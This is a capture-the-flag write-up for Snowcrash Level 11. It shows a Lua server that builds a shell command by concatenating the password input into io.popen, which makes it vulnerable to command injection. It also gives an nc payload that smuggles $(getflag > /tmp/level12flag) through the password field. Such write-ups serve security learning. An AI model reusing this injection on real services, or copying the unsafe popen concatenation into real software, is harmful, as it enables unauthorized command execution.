## Introduction

In Level 11, we are provided with a Lua script that starts a server on port 5151. The objective is to exploit a security vulnerability in this script to gain unauthorized access.

## Step-by-Step Guide
### Step 1: Understanding the Lua Script

First, let's examine the Lua script located in the home directory of Level 11. The script starts a server on port 5151.

Here is the content of the Lua script:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```

### Step 2: Identifying the Vulnerability
The vulnerability lies in the hash function, specifically in this line:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
The input pass is directly concatenated into a shell command without any sanitization, leading to a command injection vulnerability.

### Step 3: Exploiting the Vulnerability

To exploit this vulnerability, we can inject a command to redirect the output of the getflag command to a temporary file.

When you connect to the server on port 5151, you are prompted to enter a password. Since the input is not sanitized, we can inject our payload.

Here is the exploit command:
```lua
echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151 && cat /tmp/level12flag
```

### Step 4: Executing the Exploit
    1. Open a terminal and run the following command to connect to the server and inject the payload:
```sh
echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151
```
    2. The `getflag` command's output will be redirected to `/tmp/level12flag`.

    3. Next, read the contents of the file to get the flag for Level 12:
```sh
cat /tmp/level12flag
```

### Summary

In this walkthrough, we identified and exploited a command injection vulnerability in a Lua script provided in Level 11 of the Snowcrash project. By injecting a malicious command, we were able to redirect the output of the getflag command to a file and retrieve the flag for the next level.
